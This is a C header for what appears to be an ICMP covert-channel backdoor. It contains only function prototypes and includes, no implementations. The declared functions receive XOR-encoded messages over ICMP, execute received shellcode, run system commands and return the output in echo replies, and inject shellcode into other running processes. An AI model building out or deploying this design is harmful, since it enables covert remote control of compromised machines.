#define Linux

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <pcap.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <bits/waitflags.h>
#include <hijack.h>
#include <hijack_func.h>

// Build response packets for sending
int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size);

// Send response packet
void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);

// Execute shellcode received from shellcode message
void run_shellcode(const unsigned char *shellcode, uint32_t size);

// Actually run the shellcode
void execute_shellcode(const unsigned char *shellcode, const unsigned char *stack );

// Execute system command and send back the results via ICMP echo reply
void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);

// Decrypt/encrypt data using the two byte key (Yay, xor)
uint32_t decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key);

// Process the received icmp message
void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);

// Inject shellcode into another running process
int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32_t size);
